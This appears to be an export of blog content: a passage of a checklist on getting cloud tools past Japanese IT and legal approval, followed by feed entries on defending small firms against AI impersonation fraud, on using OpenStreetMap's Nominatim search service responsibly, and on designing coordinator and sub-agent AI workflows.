There is a second thing most people miss: there are two tracks, not one.

The first track is the ringi itself — the business approval: purpose, cost, expected effect, who decided. The second track is a separate review that many companies run for cloud services: an IT/security usage review of the tool itself, with its own application form, its own reviewers, and its own timeline. Passing one track does not pass the other. Proposals stall for weeks because the proposer only prepared for the track they could see. Before you submit anything, find out whether your company runs both — and prepare for both from the start.

The 12 questions

Here is the checklist, in roughly the order it tends to arrive. For each one: what you should have ready before you are asked.

1. Will our data be used to train the vendor's models?
The first question, almost always. Prepare: whether the plan you are buying excludes training use, and whether that exclusion is written into the contract or data processing addendum — not just the marketing page.

2. How long is our data retained, and can we set the retention period?
Prepare: the default retention for inputs and outputs, and whether an admin can shorten it.

3. Where is data stored and processed?
Prepare: the storage region and the processing region — they are not always the same — and whether region pinning exists on your plan.

4. Who are the subprocessors?
Prepare: the vendor's current subprocessor list, reviewed by you before IT reviews it, and a note on how change notifications work.

5. What third-party certifications does the vendor hold?
Prepare: ISO/IEC 27001 (ISMS) — checking that the certificate's scope actually covers the tool you are buying, not a parent company or a different product — and whether a SOC 2 Type II report exists and how it is shared.

6. How is data encrypted, in transit and at rest?
Prepare: both halves separately. "Encrypted" as a single word is not an answer.

7. Does it support SSO/SAML and SCIM — including offboarding?
Prepare: whether single sign-on and automated provisioning are on your plan tier (they are often enterprise-only), and what happens to a departing employee's account and content. Many IT departments won't manage a separate password silo, and orphaned accounts are a classic audit finding.

8. Are audit logs available, and for how long?
Prepare: which events are logged — logins, data access, admin changes, exports — and the retention period.

9. If the vendor has a security incident, how quickly will they notify us?
Prepare: the contractual notification window, in hours, from the vendor's documents. More on this one below.

10. Does use from Japan involve cross-border transfer of personal data under the APPI?
Prepare: the facts — whether personal data is involved, and which countries it would be stored or processed in. The judgment itself is not yours to make. More on this one below, too.

11. Can we cap or control costs?
Prepare: spending limits, usage alerts, and what happens when the cap is hit. Usage-based AI pricing that grows silently is exactly what finance is afraid of.

12. What happens to our data when the contract ends?
Prepare: export formats, the deletion timeline after termination, and whether a deletion certificate is available. Approvers ask about the exit before they approve the entrance.

Three questions that surprise people The APPI question is not yours to answer

Question 10 is the one foreign proposers most often get wrong — by answering it. Japan's Act on the Protection of Personal Information (APPI) has specific rules about providing personal data to parties in foreign countries, and whether your tool's setup is acceptable under those rules is a legal judgment. Your legal department owns that judgment, not you, and definitely not the vendor's sales page.

Your job is narrower and more useful: prepare the facts. Does the tool involve personal data at all — names, email addresses, text that users paste in? Where would that data be stored, and where processed? Which subprocessors, in which countries? Assemble those facts from the vendor's data processing addendum and subprocessor list, then hand them to Legal early, while the proposal is still moving. The mistake is writing a confident legal conclusion into your own proposal. The skill is arriving with clean facts and a clear question.

"How fast will they tell us?" comes before almost everything

New proposers expect incident notification (question 9) to be a minor operational detail. Approvers treat it as a headline item, for a simple reason: your company's own incident response — and any reporting duties it carries — cannot start until the vendor speaks. A prepared answer names the window from the contract documents: notification within a stated number of hours of the vendor confirming an incident, through a stated channel, ideally with a public status page. "They take security seriously" is not an answer. "Within 72 hours, per section X of the DPA" is.

Question 12 feels backwards the first time you see it: you are proposing to start using a tool, and the form asks how you will stop. But from the approver's side it is rational. A tool that cannot be exited — data locked in proprietary formats, deletion timelines unstated — is a permanent commitment disguised as a subscription. Naming the export format, the deletion window, and the deletion certificate up front converts an open-ended risk into a bounded one, and bounded risks get approved.

One more set of questions, from a different department

The security sheet is not the whole gauntlet. Accounting, procurement, and legal run their own checks, and they surface late: Can the vendor be paid by invoice, in yen, on your company's payment terms — or is a Japanese domestic reseller available, which solves several of these at once? None of these are IT questions, and all of them have stalled foreign tools for weeks. Prepare them in parallel, not after the security review clears.

Accounting owns 11 and invoicing, and IT and Legal share 12. Nobody on that list is asking to be difficult; each is asking whether their name is safe on this approval.

That is why the shape of a good answer matters more than its length. A good answer does not say "I checked and it's fine." Three moves, in order:

  2. Pre-consult IT with the sheet half-filled. Walking in early with partial answers and specific questions is normal practice in Japanese companies — it is how proposals get shaped before they are judged. Walking in after a rejection is much harder.
  3. Attach the completed sheet to your ringisho. Let the approvers find the answers inside the proposal instead of starting a second round of questions.

items.title: AI impersonation fraud: a no-cost defence plan for small businesses
items.summary: This month the US Department of Justice announced an indictment alleging that three foreign nationals used AI to impersonate CEOs and attorneys in a fraud scheme worth more than US$129 million, as reported in the technology press. We have not seen the court documents ourselves, so treat the figures as reported. The lesson for a small business does not depend on the exact number: a convincing voice, email or video of someone you trust is no longer proof of identity. At Digitt Hype we build websites, apps and automation for businesses, and we are often the people a client calls after something odd happens. Here is the practical version of how to protect a Pakistani SME from this kind of impersonation, without buying anything expensive. Why small businesses are not too small to target Large firms get the headlines, but the attack works the same way on a trading company or a clinic: someone pretends to be the owner, a supplier or an accountant, and asks for an urgent payment or a change of bank details. What AI changes is the cost of making that pretence believable. Spelling mistakes and awkward phrasing used to be a warning sign. They are less reliable now. Five rules that cost nothing Verify payment changes on a second channel. If a supplier emails new bank details, call them on a number you already had, not one in the email. Agree a callback rule for money. Any transfer above an amount you choose needs a spoken confirmation from a second person. Never approve on urgency alone. "Do it now, I am in a meeting" is the classic script. Make a short delay normal. Lock down the accounts that prove identity. Turn on two-step verification for email, the website admin, domain registrar and social pages. A hacked business Facebook page can also take the ad account with it, which we wrote about in our guide on recovering a hacked Facebook page and disabled ad account . Limit who can change what. Fewer admin accounts means fewer ways in. Your website is part of the picture Attackers copy real company sites to make fake invoices and fake login pages look genuine. Three things make that harder and your real site easier to trust: Keep the CMS, plugins and server software updated. Use HTTPS everywhere and publish a clear contact page with a real phone number, so customers can check you. Tell customers plainly, on your site and in invoices, that you never change bank details by email. If you want a broader view, our guide to AI scams, deepfakes and cyber security for Pakistani businesses goes through more scenarios. A short drill your team can run Once a quarter, send a harmless fake request to your own finance person, for example an invoice from a made-up supplier with new bank details. See whether they check it. Then talk about it without blame. One practice run teaches more than a policy document nobody reads. What not to do Do not rely on trying to spot a fake voice by ear. Process beats instinct. Do not share one admin password across the team. Do not assume your bank will always catch it. Recovery after a transfer is slow and uncertain. Takeaway The reported case is large, but the defence for a small firm is modest: confirm money requests on a second channel, secure the accounts that prove who you are, and rehearse the process once. If your website or app also needs a security review, our Web Development service page explains how we handle maintenance and hardening, and you can start a conversation at digitthype.com .
items.summary_html:
This month the US Department of Justice announced an indictment alleging that three foreign nationals used AI to impersonate CEOs and attorneys in a fraud scheme worth more than US$129 million, as reported in the technology press. We have not seen the court documents ourselves, so treat the figures as reported. The lesson for a small business does not depend on the exact number: a convincing voice, email or video of someone you trust is no longer proof of identity.

At Digitt Hype we build websites, apps and automation for businesses, and we are often the people a client calls after something odd happens. Here is the practical version of how to protect a Pakistani SME from this kind of impersonation, without buying anything expensive.

Why small businesses are not too small to target

Large firms get the headlines, but the attack works the same way on a trading company or a clinic: someone pretends to be the owner, a supplier or an accountant, and asks for an urgent payment or a change of bank details. What AI changes is the cost of making that pretence believable. Spelling mistakes and awkward phrasing used to be a warning sign. They are less reliable now.

Five rules that cost nothing
  1. Verify payment changes on a second channel. If a supplier emails new bank details, call them on a number you already had, not one in the email.
  2. Agree a callback rule for money. Any transfer above an amount you choose needs a spoken confirmation from a second person.
  3. Never approve on urgency alone. "Do it now, I am in a meeting" is the classic script. Make a short delay normal.
  4. Lock down the accounts that prove identity. Turn on two-step verification for email, the website admin, domain registrar and social pages. A hacked business Facebook page can also take the ad account with it, which we wrote about in our guide on recovering a hacked Facebook page and disabled ad account.
  5. Limit who can change what. Fewer admin accounts means fewer ways in.
Your website is part of the picture

Attackers copy real company sites to make fake invoices and fake login pages look genuine. Three things make that harder and your real site easier to trust:

  • Keep the CMS, plugins and server software updated.
  • Use HTTPS everywhere and publish a clear contact page with a real phone number, so customers can check you.
  • Tell customers plainly, on your site and in invoices, that you never change bank details by email.

If you want a broader view, our guide to AI scams, deepfakes and cyber security for Pakistani businesses goes through more scenarios.

A short drill your team can run

Once a quarter, send a harmless fake request to your own finance person, for example an invoice from a made-up supplier with new bank details. See whether they check it. Then talk about it without blame. One practice run teaches more than a policy document nobody reads.

What not to do
  • Do not rely on trying to spot a fake voice by ear. Process beats instinct.
  • Do not share one admin password across the team.
  • Do not assume your bank will always catch it. Recovery after a transfer is slow and uncertain.
Takeaway

The reported case is large, but the defence for a small firm is modest: confirm money requests on a second channel, secure the accounts that prove who you are, and rehearse the process once. If your website or app also needs a security review, our Web Development service page explains how we handle maintenance and hardening, and you can start a conversation at digitthype.com.

items.title: Antes de conectar un buscador de destinos a Nominatim: decisiones que debes tomar
items.summary: Por el equipo de Mapitt , una plataforma venezolana de viajes. Guía documental elaborada con inteligencia artificial; no describe la infraestructura ni las fuentes de datos actuales de Mapitt. Una caja de búsqueda puede parecer sencilla: el viajero escribe un destino y la aplicación muestra lugares. Sin embargo, la fuente de datos y el servicio que responde tienen condiciones distintas. Antes de implementar la función, conviene separar tres decisiones: qué datos usar, quién ofrece la búsqueda y cómo se presentará la atribución. 1. Distingue los datos abiertos del servicio público OpenStreetMap ofrece datos bajo la licencia ODbL; eso no convierte cada servidor público que usa esos datos en una API gratuita ilimitada. Esta guía trata específicamente del servidor público nominatim.openstreetmap.org . Su política de uso no se aplica automáticamente a instalaciones propias ni a servicios operados por terceros, que pueden tener reglas diferentes. Un proveedor comercial, una instalación propia y el servicio público pueden usar software o datos parecidos, pero tener condiciones, capacidades y responsabilidades diferentes. Lee los términos del proveedor elegido, incluyendo los de almacenamiento y redistribución de datos. 2. Diseña la interacción para la política aplicable La política del servidor público, consultada el 27 de noviembre de 2026, establece un máximo absoluto de una petición por segundo para toda la aplicación, exige un Referer o User-Agent válido que identifique la aplicación y pide atribución apropiada. Ese máximo es un techo, no una garantía de capacidad ni una meta de consumo. La fundación advierte que su servicio tiene capacidad limitada y que las condiciones pueden cambiar. En particular, no permite implementar autocompletado usando esa API pública . Si tu diseño ofrece sugerencias mientras se escribe, elige otro servicio que lo permita o una instalación propia y revisa sus condiciones. Tampoco utilices el servidor público para extraer sistemáticamente todos los puntos de interés de una zona. La política recomienda, cuando sea posible, un intermediario y caché, y exige que la aplicación pueda cambiar de servicio a petición de la fundación sin requerir una actualización del programa. Las búsquedas activadas por usuarios se admiten para uso moderado y dentro de los límites agregados de toda la aplicación. La geocodificación masiva tiene restricciones adicionales: consúltalas antes de iniciar un proceso por lotes. 3. Prepara una experiencia que no dependa de una respuesta perfecta Una arquitectura conceptual para búsquedas explícitas puede tener estas piezas: Un formulario donde la persona escribe la consulta y pulsa «Buscar»; no se envía una petición por cada letra. Un componente de servidor que valida lo recibido, elimina información innecesaria, aplica los límites globales y consulta la caché antes de contactar al proveedor elegido. Un adaptador sustituible para el proveedor, con configuración actualizable sin distribuir una nueva versión de la aplicación. Una interfaz que muestra varios resultados con su región y país, permite aclarar búsquedas ambiguas y comunica cuando no hay resultados o el servicio no está disponible. Este esquema no garantiza por sí solo el cumplimiento de la política: hay que configurar límites para todo el tráfico, identificar la aplicación, manejar la caché y respetar las reglas de uso y privacidad del proveedor. No envíes datos personales ni confidenciales al servicio público de Nominatim. 4. Atribuye la información en el lugar correcto La página oficial de copyright de OpenStreetMap exige dar crédito a OpenStreetMap y sus colaboradores y dejar claro que los datos están disponibles bajo ODbL. Las pautas de visualización dependen del medio: un mapa interactivo, una imagen y una distribución de datos pueden requerir tratamientos distintos. La licencia de datos y la política de un servicio de búsqueda son obligaciones separadas; revisa ambas para tu producto concreto. Una comprobación antes de lanzar Pregunta Decisión que debe quedar documentada ¿Quién responde las consultas? Proveedor o instalación elegida y sus condiciones vigentes. ¿La búsqueda es explícita o autocompletada? Interacción permitida por ese servicio, sin asumir que todos aceptan lo mismo. ¿Cuánto tráfico habrá en total? Presupuesto global, protección ante picos y mecanismo de cambio de proveedor. ¿Qué datos salen del dispositivo? Consulta mínima y medidas de privacidad adecuadas. ¿Cómo se acredita la fuente? Atribución visible y referencia a la licencia, ajustadas al medio. Fuente principal: Nominatim Usage Policy . Las reglas pueden cambiar; vuelve a consultar la versión oficial antes de desplegar. Para la licencia y atribución, revisa OpenStreetMap: Copyright and License .

items.title: The Foreman Carries No Tools: Sub-Agents and Separation of Concerns
items.summary: Why split one agent that can do everything into five narrower ones? Because the one that does everything is the hardest to evaluate. I want my agents to do more on their own, with each making decisions within a clearly defined scope of responsibility. The foreman delegates. The specialists do the work. A person approves the result or guides the next iteration. That means separating who does the work from who chooses what happens next. Automate what can be checked. Let the model decide when the criteria are clear. Hand it to a person when they aren't. The idea I'll keep coming back to: the foreman carries no tools. The coordinator only decides who works next. Each crew member holds only the tools for their own job, and a person signs off at the end. The foreman hands out the work. The crew holds the tools. Why not one big agent? You could give one agent web search, file access, writing and review, and tell it to get on with it. Claude Code supports both doing that work in the main session and delegating to sub-agents. For the systems I’m describing here, I wanted to make the division of responsibilities explicit: the coordinator chooses who works next, and each specialist gets the tools its job requires. That’s a workflow choice you can implement in Claude Code too. But when one agent researches, writes the notes and judges its own work, those responsibilities are harder to evaluate independently. When something is wrong, it takes more effort to trace where it went wrong. Splitting the work gives each job a defined input, an output and criteria you can test. Those measurements help you decide how much autonomy to give it. 1 I have been building and architecting agents for the last few years, at my day job and in personal projects. Before that I was an Architect at Salesforce, where I architected and built data pipelines for Desk.com, Einstein Bots and Agentforce. Agentic workflows are a natural progression of that work, and I love the learning that extends my background in distributed systems. What I enjoy is the detail: what works, what doesn't, and where the line sits between the system's decisions and mine. This post comes from two perspectives. The reference system, the one I built for my Improving Stage 5 AI Certification, is built with Pydantic AI. And the agents that produced this blog post run from "FactoryHolton", a Tauri app I built that starts Claude Code agents from a plugin I wrote. From those perspectives I'll share what I have learned, and anchor it in Anthropic's Claude Academy courses. Three stages moved the control flow from my code to a model Improving, where I work these days, has internal stages for evaluating a person's capability in building and architecting AI systems. Three matter for this post, and the last two are two answers to the question: who decides what runs next? Stage 3 is prompt evaluations. You measure a prompt with evals. That matters because LLM outputs are probabilistic, and evals are how you make them more confined and predictable, for an acceptable percentage of the time, with the models being used. Stage 4 is a sequential workflow on the rails. Stages run in a fixed order, with something like Temporal between them and data passed from one stage to the next. You can still have human-in-the-loop punch-outs, but the path is basically sequential. I built something like this for a startup in the past. Stage 5 is a coordinator (orchestrator) over sub-agents. The coordinator does not have the tools the sub-agents have. Each sub-agent has a role, a confined set of tools, a goal and a data interchange format. The coordinator reads what comes back and "decides" where to go next. There is no preconfigured path, only a means to an end that the coordinator judges. The shift from 4 to 5 is who owns the control flow. In Stage 4 my code does. In Stage 5 a model does, inside limits my code enforces. Stage 5 isn't simply the better one. It earns its place when the next step depends on what came back, and the rails earn theirs when it doesn't. 2 A sub-agent is a crew member with one job and one toolbox Four things define a sub-agent in my design. It has a role , which is one job: researching, drafting, or "adversarial review". It has a scoped set of tools , only what that job needs. 3 It has a goal , which says what done looks like. And it has a data interchange format , a typed output, so whoever runs it next receives something checkable instead of free text. The crew is the same whether it is on the sequential rails or directed under a foreman. What changes is who reads the output. On the rails, code passes it to the next stage. Under a foreman, a coordinator defined by what it lacks reads it: it can launch sub-agents and nothing else. It can't search the web, read files or sign anything off. The study-pack system puts a foreman, a rulebook, a crew and a person in one loop For my Improving Stage 5 submission I built a system that produces study material for the Claude Certified Architect – Foundations exam (CCAR-F): grounded notes and original practice questions for each exam objective. The framing is building a set of materials to learn a topic, and anchoring it in a source of truth; in this case the Claude Certified Architect – Foundations objectives are the source of truth. A person reviews and signs off on the material. This one needs a foreman, because the next step really does depend on what comes back: a review that raises a critical challenge sends work back for revision, and a clean one lets it move on. The coordinator governs and does no work. Its only tools are five launch_* functions. It reads each result and picks the next dispatch. When the reviewer raises a critical challenge, it revises the challenged artifact and has it reviewed again. A test checks that the coordinator's bound tools are exactly the launch_* set, and that a manifest declaring a work tool is refused. The harness is plain code, with no model in it. It sits between the coordinator and every sub-agent. Each sub-agent returns a typed output (a Pydantic model), and the harness validates it before the coordinator sees anything. It also writes the files itself, refuses out-of-order or stale work, and records every step with tokens, cost and the session's correlation ID. The coordinator gets either a validated result or a structured error, and never unchecked prose. 4 Each sub-agent holds only its own tools. Each agent is built from a manifest in agents/ with only the tools it declares. Sub-agent Tools Researcher web_search Notes writer none Question writer none Adversarial reviewer read_file , in its own context Final review writer none Table 1: Tools given to each sub-agent. The writers have no tools at all, not even one to save their work. Each returns a typed result, and the harness, plain code with no model, validates it and writes the file. A sub-agent can't put anything on disk that hasn't passed its schema. The reviewer runs in a fresh context each time, with no shared history. It reads the session's files and checks claims against their sources. People decide at the checkpoints. The coordinator chooses who works next, but it can't approve anything. The substance decision and the sign-off are a person's commands, recorded with their identity. Every session elevates to a person by design. At that point the person eliminates the ambiguity and provides direction, much like an attentive supervisor would. At the punch-out, the foreman asks. A person removes the ambiguity and points the way, like an attentive supervisor. Evaluations measure the output of agent skills and the final result Evaluations measure each sub-agent's output against criteria in the goal, the coordinator's decisions against scripted results, the reviewer's catch rate on planted defects, and whether the whole system completes a session end to end (3 of 3 live Domain 1 sessions). They also measure LLM cost for a given model used. These figures come from my own evals and sessions: All 3 live sessions reached the human checkpoint with every task statement complete and a reviewed final review, with no manual correction. One full session made 63 dispatches, with 13 coordinator-directed revisions, and cost $0.32. The coordinator eval scored 24/24 against scripted sub-agent results. 5 The adversarial reviewer caught planted defects 178/180 times, with clean twins to check it doesn't raise false alarms. Prompt caching cut the coordinator eval's cost from $0.169 to $0.053 with the same 24/24. The comparison case: Claude subagents as the "crew" behind reviewing my blog posts To compare my Pydantic-based agents to Claude subagents, I built some Claude subagents for adversarial reviews for my blog posts. The agents that helped produced this post are invoked from an app I built for my own use, which I call FactoryHolton. It has a Mac app and an Android app where I can assemble my raw notes and start to craft a draft of a post. My sub-agents keeping me on task with the goals after adversarial review. "ASK MARK" questions review for accuracy, clarity, and other factors The Tauri app reaches Claude through Claude Code itself, not the API. Every stage goes through a small Python script, run-stage , which starts Claude Code headless ( claude -p ) once per stage, as a named agent from a plugin I wrote: factory-h:writer , factory-h:critic , factory-h:editor . Each run can only read and write inside that piece's work folder, and the script, not the agent, records what each stage produced. The Android app never calls Claude: it captures links and notes and syncs them to the Mac, which runs the "writer", "critic", "editor" agents. The app copies my plugin into the writing workspace. 6 A small Python script, run-stage , then launches each specialist as a separate headless Claude Code session using claude -p --plugin-dir … --agent factory-h: . These are supported CLI options: the plugin loads for that run without a separate installation step. Either my app or an orchestrator session decides the sequence; Claude Code runs each specialist. The plugin itself looks like this: factory-h/ ├── .claude-plugin/plugin.json name "factory-h", version 1.0.0 ├── agents/ the crew: one Markdown file each │ ├── writer.md critic.md editor.md │ ├── angles.md proposes angles for a piece │ └── categorizer.md sorts captures into projects └── skills/ shared know-how the agents load ├── marks-voice/ my 12 voice rules ├── evidence-and-attribution/ ├── hugo-format/ front matter, figures, Mermaid, tables ├── geometric-builder/ the figure style and its reference sheet ├── editorial-review/ the critic's criteria └── project-matching/ for the categorizer The factory-h plugin: the agents are the crew, and the skills are the know-how they share. Each file in agents/ is a sub-agent definition, and its frontmatter is where the tools go into the crew member's hands. Here is the editor's, for example: name : editor tools : Read, Write, Glob skills : [ marks-voice , evidence-and-attribution , hugo-format , geometric-builder ] version : editor-5 The editor can read, write and find files, and that is all: no shell and no web search. It loads four of the shared skills, so it edits in my voice, keeps claims tied to their sources, and writes valid Hugo. The critic loads editorial-review and evidence-and-attribution but not my voice rules, so the one judging the draft works from review criteria, not from the instructions the editor writes by. Who decides which stage runs next depends on how I start it. When I run /draft in Claude Code, an orchestrator session decides: it runs the writer, reads the critic's verdict, and chooses whether the editor runs again, at most two rounds, stopping early if the critic raises a question only I can answer. That's the Stage 5 shape, a foreman with no tools deciding from what comes back. When I press a "Revise" button in my Tauri app, nothing decides: the app runs a fixed sequence (open a cycle, run the editor with my comments, offer the new draft for review), which is Stage 4 and what I want there, because my comments already say what should happen. Either way, every run ends at review, and only I approve and publish. Running it has taught me four things about delegating to Claude agents. The foreman's empty hands are a setting, not a request. The orchestrator's permissions deny Write and Edit, and the only command it may run is the stage script. That's the foreman with no tools, enforced by configuration rather than by asking nicely. Stamp every agent with a version. Each stage records its agent's version and a hash of its skills. When a revision came back in the old style, the manifest showed at a glance that editor-2 had run instead of editor-4: the app I was running still carried the old skills. The editor does exactly what it's told, and no more. It's instructed to keep what works, so comments on single passages got single-passage fixes. To restyle the whole piece, I had to say so in one general note. Check what comes back before it counts. A stage only counts once its output exists and is hashed into the manifest, and a figure has to pass an allowlist (no scripts or links in the SVG), or the stage fails outright. That is FactoryHolton's rulebook on the handback, the one Claude Code leaves to you. Comparing my Pydantic AI agents with Claude Code sub-agents How does the crew I built with Pydantic AI compare with Claude Code’s sub-agents? Start with where they work: each Claude Code sub-agent gets its own context window and reports back to the parent with a summary. Anthropic's subagents start from a different focus than responsibility: context. Every tool call, file read and search result in a Claude Code chat lands in the main context window, which is finite, and once it fills up Claude starts losing track of earlier parts of the conversation. A sub-agent gets its own context window. It starts with two things: a custom system prompt from its configuration file, which defines its role and behaviour, and a task description written by the parent agent. It then works on its own, reading files, running searches or editing code, and when it's done only a summary comes back to the main conversation. Claude Code keeps the rest in a separate transcript file. Anthropic's Introduction to subagents course uses an example: finding which service handles refunds in an unfamiliar codebase. Without a sub-agent, Claude might read 15 files and run several searches, all of it filling your context when you needed one fact. With the built-in Explore sub-agent, your main context records only the question and the summary. Claude Code ships with built-in sub-agents (General purpose, for multi-step tasks that need exploration and action; Explore, for fast codebase search; and Plan, used in plan mode), and you can write custom ones with their own system prompts and tool access: a code reviewer, a test writer, a documentation generator. 7 If you'd rather watch than read, Anthropic's official video What are subagents? introduces them. A Claude Code "crew" member is one Markdown file A Claude Code sub-agent is a Markdown file with YAML frontmatter, and the body of the file is the sub-agent's system prompt.
